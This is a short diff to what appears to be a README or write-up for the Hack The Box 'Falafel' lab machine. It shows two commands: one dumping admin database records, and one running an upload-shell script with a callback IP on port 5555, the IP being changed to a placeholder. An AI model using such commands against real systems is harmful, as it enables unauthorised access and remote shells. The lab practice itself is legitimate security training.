@@ -16,5 +16,5 @@ Database Table
 python3 dump.py -u admin -id 1
 ```
 ```
-python3 upshell.py -t falafel.htb -ip 10.10.14.9 -p 5555
+python3 upshell.py -t falafel.htb -ip 10.10.x.x -p 5555
 ```
